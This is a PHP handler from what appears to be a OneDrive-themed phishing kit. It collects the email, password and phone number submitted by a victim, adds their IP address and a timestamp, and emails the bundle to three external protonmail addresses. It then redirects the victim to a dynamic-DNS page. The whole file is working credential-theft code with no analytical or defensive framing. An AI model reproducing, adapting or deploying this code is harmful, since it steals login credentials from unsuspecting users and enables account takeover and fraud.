<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------\n";
$message .= "email: ".$_POST["ai"]."\n";
$message .= "password: ".$_POST["pr"]."\n";
$message .= "phone number: ".$_POST["ph"]."\n";
$message .= "User IP : ".$ip."\n";
$message .= "Date : ".$adddate."\n";
$message .= " - OneDrive Newest-\n";

$recipient = "chillerzmnku@protonmail.com,paulinacox@protonmail.com,ps20202@pm.me";
$subject = "Onedrive";
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$headers .= "godaddy";
$arr=array($recipient, $ip);
foreach ($arr as $recipient)

mail($recipient,$ip,$message,$headers);?>






<script type="text/javascript">

</script><meta http-equiv="refresh" content=0;https://cloud-ddrives.ddns.net/3dgh21bepw.html>    